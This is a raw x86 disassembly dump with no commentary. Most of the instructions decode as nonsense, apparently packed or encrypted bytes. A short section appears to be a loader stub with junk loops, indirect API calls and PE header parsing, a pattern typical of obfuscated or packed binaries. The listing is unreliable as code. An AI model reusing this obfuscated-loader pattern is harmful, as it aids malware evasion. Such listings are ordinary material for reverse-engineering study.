  40ffb3:	xor    eax,DWORD PTR [edi]
  40ffb5:	(bad)  
  40ffb6:	lods   eax,DWORD PTR ds:[esi]
  40ffb7:	pop    ebp
  40ffb8:	push   ecx
  40ffb9:	inc    ebx
  40ffba:	push   ecx
  40ffbb:	jb     0x410038
  40ffbd:	leave  
  40ffbe:	loope  0x40ff5c
  40ffc0:	xor    BYTE PTR [eax+0xe51d4],ch
  40ffc6:	(bad)  
  40ffc7:	xchg   esi,eax
  40ffc8:	inc    esi
  40ffc9:	js     0x40ff80
  40ffcb:	rol    BYTE PTR ds:0x83e7a81a,cl
  40ffd1:	dec    eax
  40ffd2:	(bad)  
  40ffd3:	xor    DWORD PTR [edx-0x8265e5a],ebp
  40ffd9:	inc    ebp
  40ffda:	or     BYTE PTR [eax-0x63568fa9],0xb0
  40ffe1:	mov    dh,0x27
  40ffe3:	dec    esi
  40ffe4:	sahf   
  40ffe5:	mov    edx,0xe27bf7f8
  40ffea:	or     al,0xab
  40ffec:	mov    ecx,0x1372fc6
  40fff1:	xchg   ebx,edi
  40fff3:	inc    edx
  40fff4:	dec    eax
  40fff5:	sti    
  40fff6:	xor    edx,DWORD PTR [esp+ebx*2-0x69764cde]
  40fffd:	mov    BYTE PTR [ebp+0x33351a6a],bl
  410003:	test   DWORD PTR [ebp-0x7b21a916],0xfa61f633
  41000d:	loopne 0x41003a
  41000f:	push   ecx
  410010:	aad    0xf7
  410012:	test   al,0x5f
  410014:	dec    eax
  410015:	jmp    0xd209b5cb
  41001a:	(bad)  
  41001c:	pop    ebx
  41001d:	jecxz  0x410097
  41001f:	add    ecx,DWORD PTR [esi+edx*4]
  410022:	xchg   esp,eax
  410023:	ins    BYTE PTR es:[edi],dx
  410024:	popf   
  410025:	cmp    DWORD PTR [edx+0x5700ccaa],ebp
  41002b:	ds sahf 
  41002d:	mov    fs,WORD PTR [esi]
  41002f:	mov    ecx,0xda276794
  410034:	mov    eax,0x4f182334
  410039:	sub    dh,dl
  41003b:	xchg   edi,eax
  41003c:	int3   
  41003d:	push   edx
  41003e:	ret    0x385b
  410041:	fisubr WORD PTR [edx-0x4adefbeb]
  410047:	(bad)  
  410048:	sbb    BYTE PTR [eax+0x72231e68],ah
  41004e:	outs   dx,BYTE PTR ds:[esi]
  41004f:	mov    ds:0xa2b828ac,eax
  410054:	push   0x92dabb22
  410059:	fnsave [ebp-0xddc91a3]
  41005f:	test   ch,bl
  410061:	sbb    eax,0x38b53060
  410066:	mov    WORD PTR [ebp+0xea09975],es
  41006c:	sbb    dh,BYTE PTR [esi-0x48]
  41006f:	ins    DWORD PTR es:[edi],dx
  410070:	shl    BYTE PTR [esi-0x282dfe37],cl
  410076:	xor    eax,0x47a1c6fc
  41007b:	xchg   BYTE PTR [ecx-0x5a00beda],ah
  410081:	out    dx,al
  410082:	and    BYTE PTR [eax],0x89
  410085:	(bad)  
  410086:	lea    esp,[esi-0x58]
  410089:	or     cl,bl
  41008b:	cmp    BYTE PTR [edx-0x3fe8433],al
  410091:	loop   0x41004c
  410093:	mov    edx,0x72b561dd
  410098:	sbb    al,0x68
  41009a:	scas   eax,DWORD PTR es:[edi]
  41009b:	std    
  41009c:	sahf   
  41009d:	lock xor ch,BYTE PTR [ebx]
  4100a0:	loope  0x4100b3
  4100a2:	pop    ebp
  4100a3:	or     eax,ebp
  4100a5:	mov    esi,0x749cd399
  4100aa:	test   DWORD PTR [esi+eax*8-0x2a84e729],edx
  4100b1:	adc    eax,0xbdb7f58d
  4100b6:	jl     0x41012c
  4100b8:	push   esp
  4100b9:	cli    
  4100ba:	scas   eax,DWORD PTR es:[edi]
  4100bb:	inc    esi
  4100bc:	pop    ebp
  4100bd:	sub    al,0xdc
  4100bf:	loopne 0x410063
  4100c1:	sub    dl,BYTE PTR [ecx+0x17]
  4100c4:	xor    ebx,esp
  4100c6:	into   
  4100c7:	in     al,dx
  4100c8:	add    BYTE PTR [eax],dl
  4100ca:	retf   0x7fe5
  4100cd:	sbb    edi,ebx
  4100cf:	sar    BYTE PTR [ebp+0x540f1361],cl
  4100d5:	push   0xb
  4100d7:	dec    eax
  4100d8:	mov    bl,0x8d
  4100da:	in     al,dx
  4100db:	in     al,dx
  4100dc:	in     eax,0x48
  4100de:	in     al,dx
  4100df:	push   ds
  4100e0:	test   al,0xd
  4100e2:	xchg   edx,eax
  4100e3:	mov    cl,0x95
  4100e5:	pop    esi
  4100e6:	or     BYTE PTR ds:0xcb7c7f18,al
  4100ec:	fs addr16 inc edx
  4100ef:	and    ecx,DWORD PTR [ebx]
  4100f1:	xchg   DWORD PTR [edi+ecx*2],ecx
  4100f4:	mov    DWORD PTR [ecx+0x1cf428c2],ecx
  4100fa:	xor    ah,BYTE PTR [edx]
  4100fc:	xchg   edi,eax
  4100fd:	ret    0x2d45
  410100:	int    0xb3
  410102:	xor    BYTE PTR [ecx],dh
  410104:	call   0x46c7dd87
  410109:	xchg   esi,eax
  41010a:	mov    dl,0x9b
  41010c:	out    0xb3,eax
  41010e:	out    0x29,al
  410110:	xor    al,0xa3
  410112:	xchg   edx,eax
  410113:	pop    edi
  410114:	inc    edi
  410115:	mov    eax,0xc9e08350
  41011a:	push   ebx
  41011b:	rol    BYTE PTR [esp+edi*1],1
  41011e:	mov    eax,DWORD PTR [ebp-0x4]
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [esi+0x7849a540],ebp
  41013a:	inc    esp
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x410122
  410142:	inc    ecx
  410143:	push   esi
  410144:	push   esi
  410145:	std    
  410146:	xor    eax,0x611d4cc
  41014b:	test   edi,0xbfbb1cda
  410151:	shl    BYTE PTR [edx],cl
  410153:	dec    esp
  410154:	std    
  410155:	out    dx,eax
  410156:	sbb    eax,0x14ec3d51
  41015b:	(bad)  
  41015c:	sar    BYTE PTR [ebp+ecx*4-0x74575918],cl
  410163:	jecxz  0x410151
  410165:	pusha  
  410166:	inc    DWORD PTR [edx+0x54]
  410169:	retf   
  41016a:	or     ebx,DWORD PTR [edx-0x2ef7c981]
  410170:	les    edi,FWORD PTR [esi+edx*8-0x66989f92]
  410177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410178:	mov    dl,0xe7
  41017a:	cmp    cl,BYTE PTR [ecx+0x2d]
  41017d:	lock outs dx,BYTE PTR ds:[esi]
  41017f:	xchg   DWORD PTR [edi+edx*1-0x61981c9c],ebx
  410186:	mov    eax,0xe4b0858d
  41018b:	das    
  41018c:	(bad)  
  41018d:	sub    DWORD PTR [ecx+0x78823592],ebp
  410193:	dec    edi
  410194:	hlt    
  410195:	pop    ebp
  410196:	pop    ebx
  410197:	sub    dl,BYTE PTR [ebp-0x23]
  41019a:	addr16 and ecx,esp
  41019d:	mov    bh,0x32
  41019f:	jbe    0x41018b
  4101a1:	leave  
  4101a2:	es stos BYTE PTR es:[edi],al
  4101a4:	push   ebp
  4101a5:	sti    
  4101a6:	(bad)
  4101a9:	and    al,BYTE PTR [ebp-0x5e2b0909]
  4101af:	pop    esi
  4101b0:	ins    DWORD PTR es:[edi],dx
  4101b1:	lahf   
  4101b2:	push   ebx
  4101b3:	dec    edx
  4101b4:	lock aad 0x14
  4101b7:	cdq    
  4101b8:	push   es
  4101b9:	cdq    
  4101ba:	fldcw  WORD PTR [edx+0x2108bbf5]
  4101c0:	lods   eax,DWORD PTR ds:[esi]
  4101c1:	stos   BYTE PTR es:[edi],al
  4101c2:	dec    edi
  4101c4:	jns    0x41023a
  4101c6:	and    eax,0x3a84d134
  4101cb:	aaa    
  4101cc:	pop    ebp
  4101cd:	mov    al,ds:0xc2817397
  4101d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101d3:	add    BYTE PTR [ebx+0x16829666],dl
  4101d9:	lahf   
  4101da:	shrd   DWORD PTR [edi+0x7b],esi,cl
  4101de:	sbb    ebp,DWORD PTR [edx-0x37bcba32]
  4101e4:	cmc    
  4101e5:	push   es
  4101e6:	retf   0x23de
  4101e9:	xor    eax,0x146cb9a1
  4101ee:	cmp    al,0x8c
  4101f0:	aaa    
  4101f1:	sub    edi,DWORD PTR [edx]
  4101f3:	and    edi,DWORD PTR [eax+0x30]
  4101f6:	aaa    
  4101f7:	data16 and cl,0xc6
  4101fb:	pop    edi
  4101fc:	sub    esi,DWORD PTR [esi+0x3]
  4101ff:	push   es
  410200:	iret   
  410201:	outs   dx,DWORD PTR ds:[esi]
  410202:	sbb    dl,BYTE PTR ds:0xde46b721
  410208:	adc    BYTE PTR [edx-0x53],0xa0
  41020c:	dec    esp
  41020d:	xlat   BYTE PTR ds:[ebx]
  41020e:	(bad)  
  41020f:	pop    edx
  410210:	push   ebx
  410211:	call   0x6a4146db
  410216:	dec    ecx
  410217:	push   ebx
  410218:	mov    ch,0x7d
  41021a:	pop    edi
  41021b:	sub    esi,ebp
  41021d:	xchg   esi,eax
  41021e:	jle    0x410217
  410220:	xor    dl,bl
  410222:	sbb    ah,ch
  410224:	data16 out 0xf6,al
  410227:	push   0x23
  410229:	push   0xff4e6a4
  41022e:	mov    ds:0xde1c6532,eax
  410233:	shl    DWORD PTR [ecx],0x79
  410236:	jp     0x41028c
  410238:	inc    ebp
  410239:	jnp    0x410267
  41023b:	ins    DWORD PTR es:[edi],dx
  41023c:	(bad)  [ebp-0x40]
  41023f:	dec    ebp
  410240:	cmp    cl,BYTE PTR [edx-0x26]
  410243:	or     bl,BYTE PTR [esi-0x2b]
  410246:	or     ebp,esi
  410248:	mov    BYTE PTR [edi-0x397f9e49],bh
  41024e:	inc    ebp
  41024f:	pop    ss
  410250:	adc    ah,BYTE PTR [ebx]
  410252:	mov    bh,BYTE PTR [ebp-0x358714f9]
  410258:	scas   al,BYTE PTR es:[edi]
  410259:	xor    eax,0xdcba1629
  41025e:	push   esp
  41025f:	repz cwde 
  410261:	mov    dh,0xd3
  410263:	ds stc 
  410265:	cmp    eax,0xe705875d
  41026a:	call   0xdd4f:0x91d43d35
  410271:	sar    DWORD PTR [esi],cl
  410273:	popf   
  410274:	adc    BYTE PTR [eax-0x2f],bl
  410277:	dec    ebp
  410278:	scas   eax,DWORD PTR es:[edi]
  410279:	dec    edi
  41027a:	jnp    0x410260
  41027c:	inc    edx
  41027d:	sub    al,0xb2
  41027f:	and    DWORD PTR [esi-0x6c],esp
  410282:	mov    BYTE PTR [esi-0x532da505],dl
  410288:	mov    ch,0x6a
  41028a:	aad    0x4e
  41028c:	adc    edx,eax
  41028e:	dec    esp
  41028f:	int3   
  410290:	sub    bh,bh
  410292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410293:	hlt    
  410294:	xor    ah,bl
  410296:	ins    DWORD PTR es:[edi],dx
  410297:	add    al,0xdd
  410299:	lods   al,BYTE PTR ds:[esi]
  41029a:	xchg   eax,esi
  41029c:	(bad)  
  41029d:	into   
  41029e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41029f:	dec    edi
  4102a0:	add    al,0x31
  4102a2:	in     eax,0x8c
  4102a4:	lods   al,BYTE PTR ds:[esi]
  4102a5:	xor    al,0xd0
  4102a7:	lods   eax,DWORD PTR ds:[esi]
  4102a8:	jnp    0x410242
  4102aa:	outs   dx,DWORD PTR ds:[esi]
  4102ab:	test   DWORD PTR [edx+ebp*1-0x57],esi
  4102af:	push   eax
  4102b0:	adc    ecx,DWORD PTR [ebp-0x733b5409]
  4102b6:	pop    ds
  4102b7:	test   eax,0x99f57365
  4102bc:	(bad)  
  4102bd:	stc    
  4102be:	lods   al,BYTE PTR ds:[esi]
  4102bf:	mov    ds:0xb12854df,eax
  4102c4:	fsubr  QWORD PTR [edx]
  4102c6:	nop
  4102c7:	mov    ebp,0x1a0f85f7
  4102cc:	jne    0x410279
  4102ce:	jnp    0x410301
  4102d0:	mov    ah,0xa0
  4102d2:	test   eax,0xf90f5450
  4102d7:	inc    esi
  4102d9:	jb     0x41029d
  4102db:	mov    ecx,0x6f3e2786
  4102e0:	int    0xca
  4102e2:	push   DWORD PTR gs:[edx-0x34f42fc6]
  4102e9:	or     esp,DWORD PTR [eax+0x23c33865]
  4102ef:	ss outs dx,DWORD PTR ds:[esi]
  4102f2:	addr16 adc al,0x91
  4102f5:	adc    ebp,DWORD PTR [ebp+0x724e09c9]
  4102fb:	xchg   edi,eax
  4102fc:	sub    BYTE PTR [edx],al
  4102fe:	iret   
  4102ff:	adc    BYTE PTR [ecx+0x4b],0x8e
  410303:	xor    DWORD PTR [ecx+eiz*2-0x40216ac7],0x5667577
  41030e:	push   ebx
  41030f:	mov    ah,0x23
  410311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410312:	scas   al,BYTE PTR es:[edi]
  410313:	in     al,dx
  410314:	or     DWORD PTR [ebx-0x709db862],eax
  41031a:	and    dh,ch
  41031c:	or     bh,BYTE PTR [ecx-0x767c6831]
  410322:	cmc    
  410323:	cli    
  410324:	stos   DWORD PTR es:[edi],eax
  410325:	int    0xeb
  410327:	into   
  410328:	push   ebx
  410329:	imul   ebp,DWORD PTR [edx],0x5e68e1e6
  41032f:	lods   eax,DWORD PTR ds:[esi]
  410330:	test   eax,0xafc3123c
  410335:	cmp    BYTE PTR [edi],bl
  410337:	mov    dh,0xc4
  410339:	stos   BYTE PTR es:[edi],al
  41033a:	lds    esp,FWORD PTR [ebx]
  41033c:	es mov ch,0x6f
  41033f:	test   eax,0x98701bc3
  410344:	push   edi
  410345:	sub    ch,cl
  410347:	stc    
  410348:	cmp    bl,BYTE PTR [ecx-0x5ae0b989]
  41034e:	cmc    
  41034f:	test   al,0xf8
  410351:	rcl    DWORD PTR es:[edx+0x9],cl
  410355:	mov    eax,ds:0xc7e2808b
  41035a:	cli    
  41035b:	clc    
  41035c:	mov    dl,0x23
  41035e:	sbb    BYTE PTR [eax],cl
  410360:	js     0x4103d5
  410362:	(bad)  
  410363:	mov    esi,0x3f59d1b5
  410368:	ins    BYTE PTR es:[edi],dx
  410369:	dec    esi
  41036a:	mov    bl,0x91
  41036c:	(bad)  
  41036d:	push   ebx
  41036e:	add    cl,BYTE PTR [ebx-0x73]
  410371:	add    al,0x58
  410373:	ins    DWORD PTR es:[edi],dx
  410374:	inc    eax
  410375:	adc    al,0xee
  410377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410378:	push   ss
  410379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41037a:	adc    cl,BYTE PTR [edx-0x459c1eb7]
  410380:	lea    edx,[edx-0x6]
  410383:	pop    esp
  410384:	lahf   
  410385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410386:	xchg   ebp,eax
  410387:	xchg   ecx,eax
  410388:	(bad)  
  410389:	mov    bl,0x15
  41038b:	aad    0x9a
  41038d:	xchg   ebx,eax
  41038e:	mov    bh,0x46
  410390:	add    BYTE PTR [ebp-0x2e7f1f55],bh
  410396:	(bad)  
  410397:	pop    ebx
  410398:	jle    0x41033d
  41039a:	jmp    0x3c815aca
  41039f:	sub    esi,esp
  4103a1:	stos   DWORD PTR es:[edi],eax
  4103a2:	add    DWORD PTR [ebx+0x6e2e773],edi
  4103a8:	rol    BYTE PTR [esi+0xe],0xff
  4103ac:	jle    0x4103cd
  4103ae:	into   
  4103af:	inc    edx
  4103b0:	lods   al,BYTE PTR ds:[esi]
  4103b1:	fs and edx,esi
  4103b4:	fs das 
  4103b6:	mov    bl,0x1d
  4103b8:	shl    dl,1
  4103ba:	push   eax
  4103bb:	push   ebx
  4103bc:	ds neg al
  4103bf:	add    ch,BYTE PTR [edi]
  4103c1:	ret    0x7f0f
  4103c4:	fcom   QWORD PTR [eax+ebp*2+0xb60fddc]
  4103cb:	sub    eax,0x23d68b8
  4103d0:	dec    ebp
  4103d1:	jns    0x4103f4
  4103d3:	(bad)  
  4103d4:	xchg   ebx,eax
  4103d5:	adc    eax,0x74e6161d
  4103da:	xchg   esi,eax
  4103db:	(bad)  
  4103dc:	xor    al,0xd2
  4103de:	inc    BYTE PTR [esi+0x16]
  4103e1:	pop    ss
  4103e2:	popa   
  4103e3:	cli    
  4103e4:	dec    ebx
  4103e5:	push   ecx
  4103e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103e7:	std    
  4103e8:	pop    ebx
  4103e9:	mov    cl,0x1e
  4103eb:	sub    eax,0x6478e421
  4103f0:	aam    0x41
  4103f2:	mov    edi,0x92de6305
  4103f7:	test   al,0xc7
  4103f9:	and    dh,BYTE PTR [edx]
  4103fb:	ror    BYTE PTR [ebp-0xdd14edf],0xb1
  410402:	mov    ebp,DWORD PTR [ebx]
  410404:	jae    0x410463
  410406:	or     DWORD PTR [edx-0x5ff72a59],0xd98f247f
  410410:	enter  0x55d0,0xbf
  410414:	jnp    0x4103f0
  410416:	sub    ch,BYTE PTR [edi-0x19320c4e]
  41041c:	or     eax,0xc685d83e
  410421:	jnp    0x4103ad
  410423:	add    BYTE PTR [ecx-0x584cea58],ah
  410429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41042a:	xlat   BYTE PTR ds:[ebx]
  41042b:	mov    al,0xa8
  41042d:	aas    
  41042e:	sti    
  41042f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410430:	push   eax
  410431:	adc    edx,ebp
  410433:	sbb    BYTE PTR [ebp+edx*1+0x2d741894],cl
  41043a:	enter  0x8047,0xda
  41043e:	cdq    
  41043f:	or     edi,eax
  410441:	shr    BYTE PTR [ecx+0x7105d6b8],0x96
  410448:	sub    ebx,esp
  41044a:	(bad)  
  41044b:	jmp    0x583e:0xe52eb649
  410452:	xor    eax,DWORD PTR ds:0xe11f23eb
  410458:	pop    bp
  41045a:	lods   al,BYTE PTR ds:[esi]
  41045b:	inc    esp
  41045c:	std    
  41045d:	ds in  eax,dx
  41045f:	inc    esi
  410460:	mov    dh,0x6c
  410462:	sbb    BYTE PTR [ebx-0x22fa7dc9],dl
  410468:	or     bh,cl
  41046a:	mul    dl
  41046c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41046d:	adc    BYTE PTR [ecx+edi*4],0xc
  410471:	out    0xa1,eax
  410473:	ror    bl,1
  410475:	iret   
  410476:	loopne 0x41042c
  410478:	mov    al,ds:0x21a6c323
  41047d:	and    al,0xa6
  41047f:	sub    DWORD PTR [ebx],0xb2432720
  410485:	mov    edx,0x67baa31b
  41048a:	sbb    al,0xe8
  41048c:	ins    BYTE PTR es:[edi],dx
  41048d:	cdq    
  41048e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41048f:	mov    dh,0xe5
  410491:	(bad)  
  410492:	mov    WORD PTR [ecx+ecx*8+0x2db20203],ds
  410499:	or     BYTE PTR [ecx+0x7d],dh
  41049c:	adc    DWORD PTR [edi+0x53],esp
  41049f:	loop   0x41049a
  4104a1:	pop    esi
  4104a2:	xchg   BYTE PTR [edi],al
  4104a4:	mov    al,0x65
  4104a6:	inc    ecx
  4104a7:	fnstenv [esp+ecx*4+0x2c]
  4104ab:	mov    ah,0x52
  4104ad:	mov    eax,ds:0x9cdc42eb
  4104b2:	mov    ch,dl
  4104b4:	mov    edi,0xc6034058
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x434677,0x1f
  4104d3:	cmp    DWORD PTR ds:0x434677,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x434677,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x434677,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x434677
  410508:	dec    eax
  410509:	mov    ds:0x434677,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x434677
  410516:	dec    eax
  410517:	mov    ds:0x434677,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x4346c7,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43470f,0x434793
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x4346cf,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434707
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x43466b,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x43466b
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x43466b,edx
  410571:	cmp    DWORD PTR ds:0x43466b,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x43466b,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x43466b,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x43466b
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x43466b,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	inc    ecx
  4105ed:	adc    ebx,DWORD PTR [edi+0x3d]
  4105f0:	test   BYTE PTR [edi+0x7e],0x7e
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x4105b3
  4105f9:	rcl    ch,1
  4105fb:	xchg   edi,eax
  4105fc:	aas    
  4105fd:	pushf  
  4105fe:	cmp    BYTE PTR [eax],0xb4
  410601:	cdq    
  410602:	imul   ecx,ebp,0x1cb0db56
  410608:	in     al,dx
  410609:	nop
  41060a:	pop    esp
  41060b:	push   esp
  41060c:	xchg   ecx,eax
  41060d:	sbb    ebx,DWORD PTR [eax]
  41060f:	popa   
  410610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410611:	push   ds
  410612:	mov    DWORD PTR [ebp-0x4a],edx
  410615:	popa   
  410616:	repz shr BYTE PTR [ebx+0x4cafdc72],1
  41061d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41061e:	and    esp,DWORD PTR [esi-0x3eb18ac]
  410624:	jmp    0x41064b
  410626:	cwde   
  410627:	or     al,0x38
  410629:	adc    BYTE PTR [esi+0x68],0xb3
  41062d:	and    BYTE PTR [edx+edx*1],ch
  410630:	mov    al,ds:0x40b28700
  410635:	push   esp
  410636:	fidiv  WORD PTR [ebp-0x753a22fc]
  41063c:	call   0xba21:0x7fbb5eaf
  410643:	xchg   ebp,eax
  410644:	pop    edi
  410645:	mov    es,WORD PTR [esi]
  410647:	shl    DWORD PTR [ecx+eiz*4+0x32],0x0
  41064c:	adc    BYTE PTR [ebx+esi*1+0x366301c7],0x7e
  410654:	sub    DWORD PTR [edx+0x4e026938],ebp
  41065a:	add    cl,BYTE PTR [edx]
  41065c:	stos   BYTE PTR es:[edi],al
  41065d:	mov    ds:0x5fb459f7,al
  410662:	rep stos DWORD PTR es:[edi],eax
  410664:	jmp    0xe02e:0x20a3ab70
  41066b:	pop    esi
  41066c:	dec    edx
  41066d:	jg     0x4106df
  41066f:	std    
  410670:	rcr    DWORD PTR [ecx+0x18ecf528],1
  410676:	xor    ecx,DWORD PTR [ebx]
  410678:	jb     0x410652
  41067a:	and    ecx,eax
  41067c:	mov    cl,0xa2
  41067e:	adc    bl,BYTE PTR [ecx-0x2e42c642]
  410684:	mov    dh,0xe8
  410686:	xor    cl,BYTE PTR [ecx-0x3f]
  410689:	or     ch,ah
  41068b:	cmc    
  41068c:	inc    eax
  41068d:	inc    edi
  41068e:	aaa    
  41068f:	sub    dh,dh
  410691:	test   ebx,0x48f0fff7
  410697:	jb     0x4106ad
  410699:	loopne 0x410681
  41069b:	push   edx
  41069c:	jmp    DWORD PTR [edx]
  41069e:	aaa    
  41069f:	int    0xb9
  4106a1:	or     ecx,DWORD PTR [edi*4+0x1e824b7a]
  4106a8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4106aa:	sbb    al,0x62
  4106ac:	arpl   dx,bp
  4106ae:	hlt    
  4106af:	adc    DWORD PTR [ecx+ecx*8-0x44],0x2a
  4106b4:	sbb    DWORD PTR [ebx-0x32],edi
  4106b7:	mov    DWORD PTR [edx],ebx
  4106b9:	mov    bh,0xe7
  4106bb:	rol    BYTE PTR [ebx+esi*2],cl
  4106be:	inc    eax
  4106bf:	adc    esi,DWORD PTR [edi+0x64197031]
  4106c5:	inc    BYTE PTR [ebp+0x6f]
  4106c8:	stos   DWORD PTR es:[edi],eax
  4106c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ca:	jbe    0x4106b0
  4106cc:	stc    
  4106cd:	ins    DWORD PTR es:[edi],dx
  4106ce:	data16 fisttp WORD PTR [ecx+edx*8]
  4106d2:	dec    esp
  4106d3:	and    eax,0x2c21371a
  4106d8:	push   0xffffff96
  4106da:	lds    esp,FWORD PTR [edi-0x70]
  4106dd:	mov    fs,ecx
  4106df:	ffree  st(4)
  4106e1:	es cdq 
  4106e3:	adc    BYTE PTR [ebx-0x5eff2fbb],dh
  4106e9:	xchg   ecx,esp
  4106eb:	push   0xffffffd2
  4106ed:	pop    ds
  4106ee:	fsub   QWORD PTR [ecx-0x45de06b4]
  4106f4:	jecxz  0x4106ba
  4106f6:	or     BYTE PTR [ebx-0x40],ch
  4106f9:	cwde   
  4106fa:	jmp    0x4106f6
  4106fc:	in     al,0x13
  4106fe:	pop    esp
  4106ff:	(bad)  
  410700:	jmp    0x4106fa
  410702:	das    
  410703:	add    BYTE PTR [edx-0x53],ch
  410706:	scas   eax,DWORD PTR es:[edi]
  410707:	pop    edx
  410708:	jbe    0x410712
  41070a:	test   BYTE PTR [esi],bh
  41070c:	push   esi
  41070d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41070e:	ret    0x81b
  410711:	sub    eax,0x5a9e9824
  410716:	ret    
  410717:	lea    edi,[ebp+0x2a]
  41071a:	push   eax
  41071b:	mov    bl,0x9c
  41071d:	jge    0x41076f
  41071f:	int    0x20
  410721:	jb     0x4106f5
  410723:	nop
  410724:	or     cl,BYTE PTR [ecx]
  410726:	or     bl,BYTE PTR [edx-0x30]
  410729:	test   DWORD PTR [edx+0x36951069],0xaa56edc4
  410733:	pop    edi
  410734:	mov    esi,0xb249f5a9
  410739:	lock in eax,0x41
  41073c:	push   ebx
  41073d:	pop    ebx
  41073e:	xchg   edx,eax
  41073f:	add    BYTE PTR [eax+ebp*4-0x3b],al
  410743:	inc    esi
  410744:	mov    ds:0xeeaa2c8e,eax
  410749:	test   BYTE PTR [esi],bh
  41074b:	ins    BYTE PTR es:[edi],dx
  41074c:	jg     0x4107a7
  41074e:	data16 hlt 
  410750:	gs push cs
  410752:	push   ebx
  410753:	inc    esi
  410754:	or     al,0x35
  410756:	push   esi
  410757:	pop    ss
  410758:	hlt    
  410759:	ins    BYTE PTR es:[edi],dx
  41075a:	dec    ebx
  41075b:	xchg   edi,eax
  41075d:	push   es
  41075e:	gs iret 
  410760:	mov    ebp,0x3e9c16d4
  410765:	jbe    0x410791
  410767:	shr    BYTE PTR [ebx],0xf9
  41076a:	mov    edi,0xb1d6cef5
  41076f:	cwde   
  410770:	xchg   edx,eax
  410771:	aas    
  410772:	ins    BYTE PTR es:[edi],dx
  410773:	jne    0x410723
  410775:	aaa    
  410776:	or     ecx,DWORD PTR ds:0xf7b5c2bc
  41077c:	mov    ds:0x9ca0a179,eax
  410781:	retf   
  410782:	aaa    
  410783:	jae    0x41079e
  410785:	lods   eax,DWORD PTR ds:[esi]
  410786:	add    eax,0x97c64ffb
  41078b:	pop    ecx
  41078c:	call   0xe710:0x9f7c57b6
  410793:	pop    esi
  410794:	xor    eax,DWORD PTR [ebx+ecx*4-0x6646f78b]
  41079b:	jb     0x4107cf
  41079d:	add    cl,ch
  41079f:	mov    dh,0x1
  4107a1:	add    BYTE PTR [eax],al
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	wrmsr  
  4107b1:	call   eax
  4107b3:	adc    al,0x41
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410820
  4107bc:	int3   
  4107bd:	test   BYTE PTR [eax+edx*4+0x7f5b1aef],dh
